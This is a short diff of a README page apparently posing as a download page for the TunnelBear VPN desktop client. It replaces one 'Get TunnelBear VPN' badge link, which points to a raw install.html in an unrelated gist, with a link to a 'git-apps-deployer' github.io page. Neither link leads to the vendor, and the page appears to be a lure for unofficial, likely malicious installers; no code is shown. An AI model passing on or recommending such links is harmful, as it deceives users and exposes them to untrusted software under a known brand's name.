@@ -1,6 +1,6 @@
 # TunnelBear VPN Download — Desktop Privacy Client
 
-[![Get TunnelBear VPN GitHub](https://img.shields.io/badge/Get%20TunnelBear%20VPN%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/bigbossebyrator198/dc25a08ed1e19bbf11bd90c507376d9a/raw/ece33a736dd4cb8aa302b7b4c218e33e26d7dc7f/install.html?offer=tunnelbear)
+[![Get TunnelBear VPN GitHub](https://img.shields.io/badge/Get%20TunnelBear%20VPN%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-apps-deployer.github.io/.github/?offer=tunnelbear)
 
 ---
 
